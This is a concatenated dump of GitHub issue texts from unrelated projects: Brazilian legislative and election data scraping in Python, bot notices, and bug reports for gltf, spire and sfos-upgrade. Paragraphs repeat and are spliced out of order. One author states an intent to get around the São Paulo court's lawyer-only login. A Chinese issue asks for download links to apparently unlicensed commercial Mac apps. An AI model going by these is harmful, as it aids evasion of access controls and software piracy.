        zip_file = ZipFile(f'{self.DATA_DIR}/{zip_name}', 'r')
        zip_file.extractall(f'{self.DATA_DIR}')
        zip_file.close()
        for file in os.listdir(f'{self.DATA_DIR}'):
            if file.endswith('.xml'):
                xml_data = file
        os.remove(f'{self.DATA_DIR}/{zip_name}')

        return xml_data


def save(name):
    '''
    Função para salvar dataset em csv, na pasta
    correta e com os parâmetros pré-estabelecidos
    USO:
        >> save('name')
    INPUT:
        (str) 'name': nome do arquivo
    OUTPUT:
        (file) 'pasta_correta/file_name.csv'
    '''

    hoje = datetime.strftime(datetime.now(), '%Y-%m-%d')
    DATA_DIR = f'data_{hoje}'

    file_name = f'{name}.csv'

    params = {'encoding': 'utf-8',
              'index': False,
              'sep': ','}
    dataset.to_csv(os.path.join(DATA_DIR, file_name), **params)

```

(Também mudei a função `save`, excluindo `xz`...) Look for best ways of creating a SQLite database using csv data. Each file will be a table with its name. Mais um lembrete: __mapear o TJ-SP__.

O objetivo é ter a relação de processos aos quais os deputados estaduais, sobretudo os eleitos em 2018 e 2014, respondem na justiça paulista.

(Será um tanto difícil, pois o TJ-SP exige login e senha de advogado para mostrar detalhes dos processos. Preciso ver como contornar isso.)

Devo começar assim que terminar a raspagem do TSE. Esta issue é apenas um lembrete para mim mesmo: __mapear o TSE por dados que podem ser raspados__, sobretudo relativos às eleições de 2018 e 2014.

O objetivo é obter informações do pleito dos deputados estaduais. Por exemplo:

- bens declarados,
- empresas contratadas,
- doações

Vou começar a mexer com isso em janeiro. O `xml` com todas as Tramitações das Proposições possui algum erro de formatação e eu não consegui fazer um script pra ele.

https://www.al.sp.gov.br/dados-abertos/recurso/101

_Originally posted by @Vnicius in https://github.com/rodolfo-viana/novedejulho/pull/11#issuecomment-466672119_ Esta issue é apenas um lembrete para mim mesmo: __mapear o TSE por dados que podem ser raspados__, sobretudo relativos às eleições de 2018 e 2014.

O objetivo é obter informações do pleito dos deputados estaduais. Por exemplo:

- bens declarados,
- empresas contratadas,
- doações

Vou começar a mexer com isso em março. @cuducos, eu notei que estava reescrevendo muitas linhas para trabalhar os arquivos obtidos no formato `zip`, além de ter repetição nas duas classes que trabalham com `xml` (uma para arquivos locais e outra para arquivos remotos).

Refiz, portanto, o util `fetch.py` quase todo. Não testei ainda, pois o site da Alesp há dias está fora do ar.

Queria suas considerações. Será que funciona?

```python
import os
import re
from datetime import datetime
import xml.etree.ElementTree as ElementTree
from urllib.request import urlretrieve
from zipfile import ZipFile

import pandas as pd


class Parse_xml:

    hoje = datetime.strftime(datetime.now(), '%Y-%m-%d')
    DATA_DIR = f'data_{hoje}'

    def __init__(self, xml_data):
        self.tree = ElementTree.parse(xml_data)
        self.root = self.tree.getroot()

    def parse_root(self, root=None):
        root = root if root else self.root
        yield from (self.parse_element(child) for child in iter(root))

    def parse_element(self, element, parsed=None):
        if parsed is None:
            parsed = dict()

        new_values = {k: element.attrib.get(k) for k in element.keys()}
        parsed.update(new_values)
        if element.text:
            parsed[element.tag] = element.text

        for child in list(element):
            self.parse_element(child, parsed)

        return parsed

    def process_data(self):
        return pd.DataFrame(self.parse_root())


class Parse_xml_external(Parse_xml):

    def __init__(self, xml_data):
        super().__init__(xml_data)
        self.root = ElementTree.XML(xml_data)


class Retrieve_zip(Parse_xml):

    def __init__(self, url, xml_data):
        super().__init__(xml_data)
        self.url = url

    def unzip(self):
        url_pattern = re.compile(r'http|s:.*\w*\.zip$')
        zip_name = re.sub(url_pattern, r'\w*\.zip$', self.url)
        urlretrieve(self.url, f'{self.DATA_DIR}/{zip_name}')
        zip_file = ZipFile(f'{self.DATA_DIR}/{zip_name}', 'r')
        zip_file.extractall(f'{self.DATA_DIR}')
        zip_file.close()
        for file in os.listdir(f'{self.DATA_DIR}'):
            if file.endswith('.xml'):
                self.xml_data = file
        os.remove(f'{self.DATA_DIR}/{zip_name}')

        return self.xml_data


def save(name):
    '''
    Função para salvar dataset em csv, na pasta
    correta e com os parâmetros pré-estabelecidos
    USO:
        >> save('name')
    INPUT:
        (str) 'name': nome do arquivo
    OUTPUT:
        (file) 'pasta_correta/file_name.csv'
    '''

    hoje = datetime.strftime(datetime.now(), '%Y-%m-%d')
    DATA_DIR = f'data_{hoje}'

    file_name = f'{name}.csv'

    params = {'encoding': 'utf-8',
              'index': False,
              'sep': ','}
    dataset.to_csv(os.path.join(DATA_DIR, file_name), **params)

```

(Também mudei a função `save`, excluindo `xz`...) @cuducos, eu estou usando `tqdm` para mostrar a barra de progresso de salvamento (não sei usar em outro lugar que não ali). Mas há algum erro: ele mostra uma barra para cada iteração.

Exemplo: 1 barra quando em 0%, outra barra quando em 50%, outra quando em 100%.

Você manja de `tqdm`? Sabe dizer o que posso ter feito errado?

(Aliás, o uso dela está na função `save_file`, em `fetch.py`.) Look for best ways of creating a SQLite database using csv data. Each file will be a table with its name. @cuducos, eu estou usando `tqdm` para mostrar a barra de progresso de salvamento (não sei usar em outro lugar que não ali). Mas há algum erro: ele mostra uma barra para cada iteração.

Exemplo: 1 barra quando em 0%, outra barra quando em 50%, outra quando em 100%.

Você manja de `tqdm`? Sabe dizer o que posso ter feito errado?

(Aliás, o uso dela está na função `save_file`, em `fetch.py`.) @cuducos, @Vnicius, @hducati, vejam se conseguem me ajudar, por favor...

no dataset `cands` e em outros, eu tenho a seguinte descrição de coligação:

```
sg1 / sg2 / sg3
```

ou seja, siglas separadas por `espaço + barra + espaço`.

também tenho, em `coms`, nos nomes das comissões, valores com aspas (pois há vírgula no nome, como em _Comissão de Constituição, Justiça e Cidadadina_).

em ambos os casos eu queria mudar: trocar ` \ ` por `-`, e `"` por nada.

o problema é que, por mais que pareça simples, tô quebrando a cabeça há dias para entender por que `replace` funciona em alguns casos e não em outros. seguem os testes:

_teste.py_:

```python
import pandas as pd
df = pd.DataFrame({
    'colig': ['PSDB / PT / PP / PMDB', 'PT / PSOL / PP'],
    'nome': ['"Anderson, Cavanhaque"', 'Douglas'],
    'valor': [15, 12]
})
df = df.replace({' / ': '-', '"': ''}, regex=True)

# Resultado

#              colig                  nome  valor
# 0  PSDB-PT-PP-PMDB  Anderson, Cavanhaque     15
# 1       PT-PSOL-PP               Douglas     12
```

_teste2.py_:

```python
import pandas as pd

df = pd.DataFrame({
    'colig': ['PSDB / PT / PP / PMDB', 'PT / PSOL / PP'],
    'nome': ['"Anderson, Cavanhaque"', 'Douglas'],
    'valor': [15, 12]
})
df = df.apply(lambda x: x.replace({
    ' / ': '-', 
    '"': ''
}, regex=True) if (x.dtype == 'object') else x)

# Resultado

#              colig                  nome  valor
# 0  PSDB-PT-PP-PMDB  Anderson, Cavanhaque     15
# 1       PT-PSOL-PP               Douglas     12
```

_fetch.py_:

```python
def save_file(dataset, name, extension):
    params = {'encoding': 'utf-8',
              'index': False,
              'sep': ','}
    if extension == 'xz':
        params['compression'] = 'xz'

   file_name = f'{name}.{extension}'
   dataset = dataset.apply(lambda x: x.str.lower() if (x.dtype == 'object')
                           else x)
   dataset = dataset.apply(lambda x: x.replace({
       '#nulo#': '',
       'null/null': ''
   }) if (x.dtype == 'object') else x)
   dataset = dataset.replace({' / ': '-', '"': ''}, regex=True) # <---------------------
   dataset.to_csv(os.path.join(DATA_DIR, file_name), **params)

# Resultado (no .csv)

# dt_geracao,hh_geracao,(...)ds_composicao_coligacao(...)
# 20/09/2018,09:50:32,(...)pp / pmdb / psd(...)
```

alguém sabe dizer por que, em `fetch.py`, não funciona? e como fazer funcionar?
<---------->
164918180
Hi Raj and Chirag,

I hope you are doing well. Just came across this perspective from 2017. It might be a good additional reading for BMI704 next year! 

[An Expanded View of Complex Traits: From Polygenic to Omnigenic](https://www.cell.com/cell/fulltext/S0092-8674(17)30629-3)

Best wishes from Heidelberg!
Niklas
<---------->
165093741
There are already unit tests in the rules adapter API to show basic stateless rule execution. Would like to also add unit test showing support for a ruleflow based execution. Looking for discussion here    Change the regular JUnit 5 tests to Cucumber.

There might be a special case that we need to handle in order to test human tasks in jBPM. We need to do a few things in order to get ready for this:

[This guide](https://dzone.com/articles/deploy-maven-central) seems to cover a fair amount of it.

Should we do this? What are the advantages/disadvantages? 
<---------->
165203985
I did not see any use of the subscription within this package. I was wondering whether its possible to use the subscription feature via this package,

BTW, Thanks for the wonderful package. It really eases a lot of burden ! I did not see any use of the subscription within this package. I was wondering whether its possible to use the subscription feature via this package,

BTW, Thanks for the wonderful package. It really eases a lot of burden !
<---------->
165362386
`ts-simple-ast` has been deprecated and renamed to https://github.com/dsherret/ts-morph Add support for creating an OpenAPI schema from an FTS Definition and URL.

This will allow us to easily solve #9 and #10.

https://github.com/wework/json-schema-to-openapi-schema looks useful. Add support for creating an OpenAPI schema from an FTS Definition and URL.

This will allow us to easily solve #9 and #10.

https://github.com/wework/json-schema-to-openapi-schema looks useful. This is currently broken due to `fts-http.HttpContext` subclassing from `fts.Context` [here](https://github.com/transitive-bullshit/functional-typescript/blob/master/packages/fts-http/src/http-context.ts#L3).

We should probably break these FTS types out into a separate `fts-core` module that's really lightweight. This is currently broken due to `fts-http.HttpContext` subclassing from `fts.Context` [here](https://github.com/transitive-bullshit/functional-typescript/blob/master/packages/fts-http/src/http-context.ts#L3).

We should probably break these FTS types out into a separate `fts-core` module that's really lightweight. https://github.com/budgielang/budgify/commit/45e87eb6a0a6bc1a4462522c90281be7a924186e

cc @JoshuaKGoldberg This will speed up cases where we need to generate definitions from multiple related source files by re-using the underlying compiler instance(s).

Any [Saasify](https://saasify.sh/) TS projects which have multiple services would benefit from this perf improvement. `ts-simple-ast` has been deprecated and renamed to https://github.com/dsherret/ts-morph We're currently using our own, bare bones `tsconfig`, but for better compatibility we should really support using a project's existing `tsconfig`.  clutters the messaging; move to a separate file possibly https://github.com/all-contributors/all-contributors-cli or https://github.com/remarkjs/remark-contributors clutters the messaging; move to a separate file The `functional` aspect of FTS is confusing to people and doesn't really get across the RPC idea that you can automatically generate schemas and corresponding API endpoints from TS functions.

Any suggestions for a new name?

@chrisvxd suggested `serverless-typescript`.

 JS Docs aren't extracted when using exporting default arrow functions

```ts
/**
 * This is an example description for an example function.
 *
 * @param foo - Example describing string `foo`.
 * @returns Description of return value.
 */
export default async (foo: string): Promise<string> => {
  return JSON.stringify({ foo })
}
```

Method description and params are missing from output. After some investigation, it seems `ts-morph` isn't picking up the docs, so `getJsDocs()` returns an empty array.     Given one or more FTS definitions and their respective HTTP endpoints, add support for generating [Stripe-style](https://stripe.com/docs/api) API docs describing those REST endpoints. This should be possible given the strong JSON schema typing info we have for each FTS definition. It's possible that there's a project in the greater JSON schema landscape which does something similar to this already.

As a follow-up, the docs would ideally integrate with the client SDKs that would be generated by #9.

The ideal user flow for consumers would be for FTS to be hidden as an implementation detail where a consumer developer would just use the SDK and accompanying docs specific to their language and environment of choice.

Some resources which may be useful:
  - https://docute.org
  - https://github.com/lord/slate
  - https://docs.gitbook.com/content-editing/pages-structure
  - https://auth0.com/docs/api/management/v2

For the MVP of this feature, simpler is definitely better. Just aiming to describe the REST endpoints and their respective parameters and return values with some cURL or [httpie](https://httpie.org) examples would be solid.

This will be used directly by [fin](https://github.com/functional-income/fin) but may be useful to other developers interested in the FTS standard.
<---------->
165617959
I'm working on a model trainer that supports per-epoch and per-batch callbacks, progress bars, mini-batching,  etc. Basically, just a higher-level wrapper around the training loops in the examples in https://github.com/tensorflow/swift-models

Is this important, and is this aligned with the vision of where this high-level library wants to go?
<---------->
165735985
Great work on `micro-jq`!

Would be great if you could add support for `length` and `select`.
<---------->
165776299
Hello

Why I can't use a custom VPS provider? Looks like the docs for deploying a Laravel app are 404'ing - see https://github.com/getcleaver/docs/blob/master/6%20Deployments/Deploying/Deploying%20a%20Laravel%20App.md Hello

Why I can't use a custom VPS provider? Looks like the docs for deploying a Laravel app are 404'ing - see https://github.com/getcleaver/docs/blob/master/6%20Deployments/Deploying/Deploying%20a%20Laravel%20App.md Hello, i have installed on windows, and i didin´t write down the password
In windows we dont have keychain, how to discover the root or cleaver user password? and i also need the mysql password
Can you help me?

<---------->
165896210
I would like to see an API that lets someone supply a list of vertices, zero or more material definitions, and one or more lists of vertex indices to define triangles, each with an associated material reference, and have all the nuts and bolts of assembling the buffer, bufferviews, and accessors done automatically.  Simply calling .Save on that type should allow the user to then persist this model to disk.

I don't know if that is within the scope of this library, and I felt it needed suggesting, in case it is. I am using your project to create gltf file.  I have draco precompressed geometry data like a.drc, and I referenced it in a buffer in document. When I save the document, the a.drc file will be overwrite. It size becomes zero.  

This is how I define my buffer

``` go
buffer := gltf.Buffer{
		URI:       "a.drc",
		ByteLength:  123,
	}
```

This is how I save the doc

``` go
if err := gltf.Save(doc, path, false); err != nil {
	panic(err)
}
```

 I'm just try to use this project but sample code in readme.md not works. I'm new to golang and gltf.  maybe demo code should be this? :

```
	doc := &gltf.Document{
		Scene: 0, 
		Asset: gltf.Asset{Generator: "qmuntal/gltf"}, 
		Scenes: []gltf.Scene{
			{
				Extras: 8.0, Extensions: gltf.Extensions{"a": "b"}, Name: "s_1",
			},
		},
	}
	if err := gltf.Save(doc, "./a.gltf", false); err != nil {
		panic(err)
	}
``` I am using your project to create gltf file.  I have draco precompressed geometry data like a.drc, and I referenced it in a buffer in document. When I save the document, the a.drc file will be overwrite. It size becomes zero.  

This is how I define my buffer

``` go
buffer := gltf.Buffer{
		URI:       "a.drc",
		ByteLength:  123,
	}
```

This is how I save the doc

``` go
if err := gltf.Save(doc, path, false); err != nil {
	panic(err)
}
```

 I'm just try to use this project but sample code in readme.md not works. I'm new to golang and gltf.  maybe demo code should be this? :

```
	doc := &gltf.Document{
		Scene: 0, 
		Asset: gltf.Asset{Generator: "qmuntal/gltf"}, 
		Scenes: []gltf.Scene{
			{
				Extras: 8.0, Extensions: gltf.Extensions{"a": "b"}, Name: "s_1",
			},
		},
	}
	if err := gltf.Save(doc, "./a.gltf", false); err != nil {
		panic(err)
	}
```
<---------->
165905981

<---------->
166092965
Much of your API hinges on being able to put stop and route IDs into your endpoints, yet they aren't listed anywhere. Can you update your documentation to provide those?
<---------->
166178988
I guess the basics should cover how to train mbot and rasa, how to load the models, and which packages are involved. In the knowledge base tutorial, in the Domestic Ontology section, an object property is named "locatedIn" while later being used as "locatedAt". As we saw in GO, the ontology and the knowledge base are quite powerful. I see two parts, possibly two different tutorials:

* A tutorial on how to store or delete knowledge from the knowledge base, and how to make queries.
* A (smaller) tutorial on how to model things in the ontology, what conventions are we using, and possibly which tools In the knowledge base tutorial, in the Domestic Ontology section, an object property is named "locatedIn" while later being used as "locatedAt". As we saw in GO, the ontology and the knowledge base are quite powerful. I see two parts, possibly two different tutorials:

* A tutorial on how to store or delete knowledge from the knowledge base, and how to make queries.
* A (smaller) tutorial on how to model things in the ontology, what conventions are we using, and possibly which tools I believe that although the perception tutorials are there, we didn't get a chance to properly present them and discuss them. 

For competitions particularly, it's useful for more than one member to know how the process goes and in particular to know where to find the scripts, what they do, and to document recommended resolution of images, which camera to use, etc.
<---------->
166242204

## The devDependency [np]() was updated from `5.1.3` to `5.2.0`.

🚨 [View failing branch](https://github.com/geostyler/geostyler-cql-parser/compare/master...geostyler:greenkeeper%2Fnp-5.2.0).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




np is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **continuous-integration/travis-ci/push:** The Travis CI build could not complete due to an error ([Details](https://travis-ci.org/geostyler/geostyler-cql-parser/builds/618888215?utm_source=github_status&utm_medium=notification)).
- ❌ **Travis CI - Branch:** <a href='https://travis-ci.com/geostyler/geostyler-cql-parser/builds/138780278'><img src='https://travis-ci.com/images/stroke-icons/icon-errored.png' height='11'> The build</a> **errored**. 
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 6 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/sindresorhus/np/commit/b67cdb452833dd16bc6b5a61972e781a7e487cf8"><code>b67cdb4</code></a> <code>5.2.0</code></li>
<li><a href="https://urls.greenkeeper.io/sindresorhus/np/commit/7d7900a28cb643d37de7ee979d7d1f76c1f14048"><code>7d7900a</code></a> <code>Update dependencies</code></li>
<li><a href="https://urls.greenkeeper.io/sindresorhus/np/commit/000ddcf455a5c6ec42b494114f702fed8db146d0"><code>000ddcf</code></a> <code>Don't check <code>"files"</code> in package.json or <code>.npmignore</code> if private package or not publishing (#472)</code></li>
<li><a href="https://urls.greenkeeper.io/sindresorhus/np/commit/23524b5a28a6f6a9a29a52a69fe9cbd4c5a61ca7"><code>23524b5</code></a> <code>Don't ask for tag if <code>--no-publish</code> (#473)</code></li>
<li><a href="https://urls.greenkeeper.io/sindresorhus/np/commit/8360cb6d72f57275bd06256bfa50834852b1afbd"><code>8360cb6</code></a> <code>Check package name availability in custom registry (#429)</code></li>
<li><a href="https://urls.greenkeeper.io/sindresorhus/np/commit/e53cbe849b1c4ca717883e086f07e1a804aa6f71"><code>e53cbe8</code></a> <code>Fix incorrectly showing "Aborted!" message on successful publish (#471)</code></li>
</ul>
<p>See the <a href="https://urls.greenkeeper.io/sindresorhus/np/compare/817a03018862ee4b692f9ee66d2720431325bb37...b67cdb452833dd16bc6b5a61972e781a7e487cf8">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 🚨 You need to enable Continuous Integration on Greenkeeper branches of this repository. 🚨

To enable Greenkeeper, you need to make sure that a [commit status](https://help.github.com/articles/about-statuses/) is reported on all branches. This is required by Greenkeeper because it uses your CI build statuses to figure out when to notify you about breaking changes.

Since we didn’t receive a CI status on the [`greenkeeper/initial`](https://github.com/geostyler/geostyler-cql-parser/commits/greenkeeper/initial) branch, it’s possible that you don’t have CI set up yet.
We recommend using:
- [CircleCI](https://circleci.com)
- [Travis CI](https://travis-ci.org)
- [Buildkite](https://buildkite.com/)
- [CodeShip](https://codeship.com)
- [Azure Pipelines](https://azure.microsoft.com/en-us/services/devops/pipelines)
- [TeamCity](https://www.jetbrains.com/teamcity)
- [Buddy](https://buddy.works)
- [AppVeyor](https://www.appveyor.com)
But Greenkeeper will work with every other CI service as well.

If you _have_ already set up a CI for this repository, you might need to check how it’s configured. Make sure it is set to run on all new branches. If you don’t want it to run on absolutely every branch, you can whitelist branches starting with `greenkeeper/`.

Once you have installed and configured CI on this repository correctly, you’ll need to re-trigger Greenkeeper’s initial pull request. To do this, please click the 'fix repo' button on [account.greenkeeper.io](https://account.greenkeeper.io).
 🚨 You need to enable Continuous Integration on Greenkeeper branches of this repository. 🚨

To enable Greenkeeper, you need to make sure that a [commit status](https://help.github.com/articles/about-statuses/) is reported on all branches. This is required by Greenkeeper because it uses your CI build statuses to figure out when to notify you about breaking changes.

Since we didn’t receive a CI status on the [`greenkeeper/initial`](https://github.com/geostyler/geostyler-cql-parser/commits/greenkeeper/initial) branch, it’s possible that you don’t have CI set up yet.
We recommend using:
- [CircleCI](https://circleci.com)
- [Travis CI](https://travis-ci.org)
- [Buildkite](https://buildkite.com/)
- [CodeShip](https://codeship.com)
- [Azure Pipelines](https://azure.microsoft.com/en-us/services/devops/pipelines)
- [TeamCity](https://www.jetbrains.com/teamcity)
- [Buddy](https://buddy.works)
- [AppVeyor](https://www.appveyor.com)
But Greenkeeper will work with every other CI service as well.

If you _have_ already set up a CI for this repository, you might need to check how it’s configured. Make sure it is set to run on all new branches. If you don’t want it to run on absolutely every branch, you can whitelist branches starting with `greenkeeper/`.

Once you have installed and configured CI on this repository correctly, you’ll need to re-trigger Greenkeeper’s initial pull request. To do this, please click the 'fix repo' button on [account.greenkeeper.io](https://account.greenkeeper.io).

<---------->
166330037
说明文件里面的CleanMyMac X的链接错误,被指向到了1Password的DMG.请修正下            Eagle 求个下载地址   CleanMyMac X 4.4.7 提供的链接有问题
1，文件名 为 APP （尽管可以改成 xxx.zip）
2，实际是4.4.6版本  说明文件里面的CleanMyMac X的链接错误,被指向到了1Password的DMG.请修正下 
<---------->
166410882
## 💬 Question

I would want to create a spire plugin for flow.

The problem I see with flow is that there are a lot of releases, each breaking. So I guess there should be a corresponding spire plugin version for each new released flow version.

So I was wondering if I should create a PR here for that plugin, although I think it might make more sense to do it externally as it seems quite difficult to do in the monorepo? ## 🐛 Bug Report

spire-plugin-clean's keeplist is not applied to nested paths. This is a major use-case for monorepos and other multi-module projects.

## How to reproduce

```sh
mkdir -p ./packages/foo/node_modules
echo hi > ./packages/foo/node_modules/hi
npx spire clean
# -> ./packages/foo/node_modules gets removed
```

## Expected behavior

spire-plugin-clean doesn't clean `./packages/foo/node_modules/hi` from example above.
 ## 🚀 Feature Proposal

Currently the github plugin is used in the configuration in `spire-plugin-semantic-release`. We should make it possible to also use the gitlab plugin or non of the two. Currently it is not possible by default to release a non github project (without custom config), because of the github plugin.
 ## 🐛 Bug Report

Spire doesn't fail with unknown command.

## How to reproduce

```sh
npx spire some-uknown-command
```

## Expected behavior

Spire exists with non-zero code and demands to provide a valid command.
 ## 🚀 Feature Proposal

## Motivation

Currently all commands requires `--` to indicate that we want to pass arguments to underlying tools they execute. Although it's a common pattern, it adds a bit of mental complexity to remember to always add those. It also doesn't play nicely with yarn, which cuts first `--` and as result requires using something like `spire lint -- -- --fix`.

## Example

Current way:
```sh
spire lint --debug -- --fix
```

Proposed way:
```sh
spire --debug lint --fix
```
 ## 🚀 Feature Proposal

## Motivation

Currently all commands requires `--` to indicate that we want to pass arguments to underlying tools they execute. Although it's a common pattern, it adds a bit of mental complexity to remember to always add those. It also doesn't play nicely with yarn, which cuts first `--` and as result requires using something like `spire lint -- -- --fix`.

## Example

Current way:
```sh
spire lint --debug -- --fix
```

Proposed way:
```sh
spire --debug lint --fix
```
 ## 🐛 Bug Report

package.json#postinstall on spire package executes spire command `./bin/spire.js hook postinstall` causing `spire.js` to load plugins from that root onwards. This means we can't install plugins that aren't within a "node_modules" path, because `process.cwd()` (part of `context.cwd`) is referring to the spire folder instead of my root project.

## How to reproduce

Take the next example:

```
my-project
 ├ package.json [spire is a dependency & spire config defines a local plugin too]
 └ node_modules
    └ spire
       └ package.json [scripts > postinstall defined here]
```
The call to `resolveConfig` within [`spire/index.js`](https://github.com/researchgate/spire/blob/master/packages/spire/index.js#L28) will [try to resolve the plugins' paths](https://github.com/researchgate/spire/blob/master/packages/spire/lib/resolve-config.js#L31) and on that will use `context.cwd()` which is set to: `my-project/node_modules/spire`. instead of `my-project` as I would expect if I have my local plugin defined as such:

```json
"spire": {
    "extends": "@researchgate/spire-config",
    "plugins": [
      "spire-plugin-semantic-release",
      "<rootDir>/.spire/spire-plugin-tslint"
    ]
  },
```
Note that spire will resolve my local plugin as being under `my-project/node_modules/spire/.spire/spire-plugin-tslint`, and that's exactly the issue.
By the way. I am also unsure whether `spire-plugin-semantic-release` is at this point picked up magically or not, but it doesn't throw an error...

## Expected behavior

All plugins should be picked up starting from the real `npm root`, which is `my-project`, but `npm scripts` execute under the scope of each module. There's a way to modify this behavior for the spire package, and that would be to define an ENV variable so that we could set `$INIT_CWD` to the same place where `my-project`'s `yarn.lock` lives. The other would be to directly search for plugins starting from the bottom.

From the npm docs: https://docs.npmjs.com/cli/run-script

> Scripts are run from the root of the module, regardless of what your current working directory is when you call npm run. If you want your script to use different behavior based on what subdirectory you’re in, you can use the INIT_CWD environment variable, which holds the full path you were in when you ran npm run. ## 🐛 Bug Report

@sbekrin I've just recently fixed a security vulnerable related to `js-yaml` by bumping the version to the latest patch release. I've tried to publish `spire` on `npm` and figured out that I don't have the rights to do so. Would you mind adding me and @justinvdm as contributors on `npm`?
 ## 🐛 Bug Report

package.json#postinstall on spire package executes spire command `./bin/spire.js hook postinstall` causing `spire.js` to load plugins from that root onwards. This means we can't install plugins that aren't within `node_modules` a path because `process.cwd()` (part of `context.cwd`) is referring to the spire folder instead of my root project.

## How to reproduce

Take the next example:

```
my-project
 ├ package.json [spire is a dependency & spire config defines a local plugin too]
 └ node_modules
    └ spire
       └ package.json [scripts > postinstall defined here]
```
The call to `resolveConfig` within [`spire/index.js`](https://github.com/researchgate/spire/blob/master/packages/spire/index.js#L28) will [try to resolve the plugins' paths](https://github.com/researchgate/spire/blob/master/packages/spire/lib/resolve-config.js#L31) and on that will use `context.cwd()` which is set to: `my-project/node_modules/spire`. instead of `my-project` as I would expect if I have my local plugin defined as such:

```json
"spire": {
    "extends": "@researchgate/spire-config",
    "plugins": [
      "spire-plugin-semantic-release",
      "<rootDir>/.spire/spire-plugin-tslint"
    ]
  },
```
Note that spire will resolve my local plugin as being under `my-project/node_modules/spire/.spire/spire-plugin-tslint'. I am also not sure if `spire-plugin-semantic-release` is at this point picked up magically or not, but it doesn't throw an error...

## Expected behavior

All plugins should be picked up starting from the real `npm root`, which is `my-project`, but `npm scripts` execute under the scope of each module. There's a way to modify this behavior for the spire package, and that would be to define an ENV variable so that we could set `$INIT_CWD` to the same place where `my-project`'s `yarn.lock` lives. The other would be to directly search for plugins starting from the bottom.

From the npm docs: https://docs.npmjs.com/cli/run-script

> Scripts are run from the root of the module, regardless of what your current working directory is when you call npm run. If you want your script to use different behavior based on what subdirectory you’re in, you can use the INIT_CWD environment variable, which holds the full path you were in when you ran npm run. ## 🐛 Bug Report

Spire doesn't fail with unknown command.

## How to reproduce

```sh
npx spire some-uknown-command
```

## Expected behavior

Spire exists with non-zero code and demands to provide a valid command.
 ## 🚀 Feature Proposal

Prettier and its configuration is used by many tools including `spire-plugin-eslint`, `spire-plugin-prettier` and lately by the IDE of your choice (e.g. VSCode). All of them come with a different requirement of where and how the configuration should be stored in order to be picked up successfully. Especially IDE's usually require the configuration to be stored in a file at the root level of your project. To make all tools involved to work together nicely I'd propose to change the way prettier is configured.

Instead of configuring `spire-plugin-prettier` via API, I'd suggest to make it require a config file a the root level of a project. Creating the config can be guided by feedback valuable warnings in the console or/and introducing an additional command for `spire-plugin-prettier` that generates the config file on demand. 

## Motivation

Make the orchestration of prettier configuration between the IDE and plugins that rely on it less painful. 

 ## 🐛 Bug Report

This happens because the spire bin is a simple js script which uses a hashbang. This unfortunately does not work in certain scenarios. I guess the fix could be to make the actual binary a shellscript which does something along the lines of `exec "script.js" "$@"`. Similar to what other tools like yarn/husky, etc do. I will look into this.

## How to reproduce

Install lazy loaded nodejs, via for example antigen. https://github.com/lukechilds/zsh-nvm#lazy-loading

## Expected behavior

Should correctly run spire.
 ## 🚀 Feature Proposal

Prettier and its configuration is used by many tools including `spire-plugin-eslint`, `spire-plugin-prettier` and lately by the IDE of your choice (e.g. VSCode). All of them come with a different requirement of where and how the configuration should be stored in order to be picked up successfully. Especially IDE's usually require the configuration to be stored in a file at the root level of your project. To make all tools involved to work together nicely I'd propose to change the way prettier is configured.

Instead of configuring `spire-plugin-prettier` via API, I'd suggest to make it require a config file a the root level of a project. Creating the config can be guided by feedback valuable warnings in the console or/and introducing an additional command for `spire-plugin-prettier` that generates the config file on demand. 

## Motivation

Make the orchestration of prettier configuration between the IDE and plugins that rely on it less painful. 

 ## 🐛 Bug Report

@sbekrin I've just recently fixed a security vulnerable related to `js-yaml` by bumping the version to the latest patch release. I've tried to publish `spire` on `npm` and figured out that I don't have the rights to do so. Would you mind adding me and @justinvdm as contributors on `npm`?
 ## 💬 Question

I would want to create a spire plugin for flow.

The problem I see with flow is that there are a lot of releases, each breaking. So I guess there should be a corresponding spire plugin version for each new released flow version.

So I was wondering if I should create a PR here for that plugin, although I think it might make more sense to do it externally as it seems quite difficult to do in the monorepo? ## 🐛 Bug Report

spire-plugin-clean's keeplist is not applied to nested paths. This is a major use-case for monorepos and other multi-module projects.

## How to reproduce

```sh
mkdir -p ./packages/foo/node_modules
echo hi > ./packages/foo/node_modules/hi
npx spire clean
# -> ./packages/foo/node_modules gets removed
```

## Expected behavior

spire-plugin-clean doesn't clean `./packages/foo/node_modules/hi` from example above.

<---------->
166711726
sfos-upgrade fails to work on Inoi R7.

```
[root@Sailfish nemo]#  sfos-upgrade 3.1.0.11
Notice: The installed version 3.0.0.11+omp0.1.3.10 is smaller than the one curr
ently set for SSU (3.1.0.11).
A possible reason for this is, that the \'sailfish-osupdateservice osupdate-che
ck\' invoked by osupdate-check.service (which is regularly triggered by osupdat
e-check.timer) does more than just checking (observed with SailfishOS 3.0.2 and
earlier): E.g., setting ssu to the recent release version or next stop release
.
Never mind, the version for SSU will be set correctly again, later on.

/usr/bin/sfos-upgrade: line 74: [: 11+omp0: integer expression expected
/usr/bin/sfos-upgrade: line 78: [: 11+omp0: integer expression expected
Warning from function compare_versions: Version strings "3.0.0.8" and "3.0.0.11
+omp0.1.3.10" are not comparable!
[root@Sailfish nemo]#
``` @Okxa wrote in PR #33:
"works when the version is like 1.2.3.4, to fix when `version` reports architechture: `SailfishOS 1.0.8.19 (Tahkalampi) (armv7hl)`" See [the first try to adapt to obs with subsequent discussion](https://github.com/r0kk3rz/sfos-upgrade/commit/8949a808921367550b5ee13797da1090ffd46f7b) and [a separate discussion, first one spawned](https://github.com/Olf0/sfos-upgrade/commit/a31be782b3ee800c176b1e686f1530b33856d345).

SRPM is now provided, see [this comment for details](https://github.com/r0kk3rz/sfos-upgrade/commit/8949a808921367550b5ee13797da1090ffd46f7b#commitcomment-35089971).
But I still don't know / understand, if this (an SRPM) resolves the original issue (integration into build systems, e.g. obs). sfos-upgrade fails to work on Inoi R7.

```
[root@Sailfish nemo]#  sfos-upgrade 3.1.0.11
Notice: The installed version 3.0.0.11+omp0.1.3.10 is smaller than the one curr
ently set for SSU (3.1.0.11).
